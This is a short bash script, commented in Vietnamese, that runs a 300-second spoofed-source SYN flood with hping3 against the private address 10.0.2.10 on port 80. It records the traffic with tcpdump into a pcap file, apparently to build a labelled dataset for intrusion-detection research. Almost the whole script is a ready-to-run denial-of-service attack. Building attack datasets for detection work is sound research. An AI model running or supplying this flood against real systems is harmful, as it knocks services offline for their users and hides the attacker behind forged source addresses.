#!/bin/bash
VICTIM=10.0.2.10
DURATION=300

echo "Bat dau IP Spoof Flood vao $VICTIM trong $DURATION giay..."
echo "START_TS=$(date +%s)"

# Da sua -i s2-eth99 thanh -i any
tcpdump -i any -w datasets/s06_ip_spoof.pcap -G $DURATION -W 1 2>/dev/null &
TCPDUMP_PID=$!

hping3 --rand-source -S -p 80 --flood $VICTIM &
HPING_PID=$!

sleep $DURATION
kill $TCPDUMP_PID $HPING_PID 2>/dev/null

echo "END_TS=$(date +%s)"
echo "Hoan tat tan cong IP Spoof Flood!"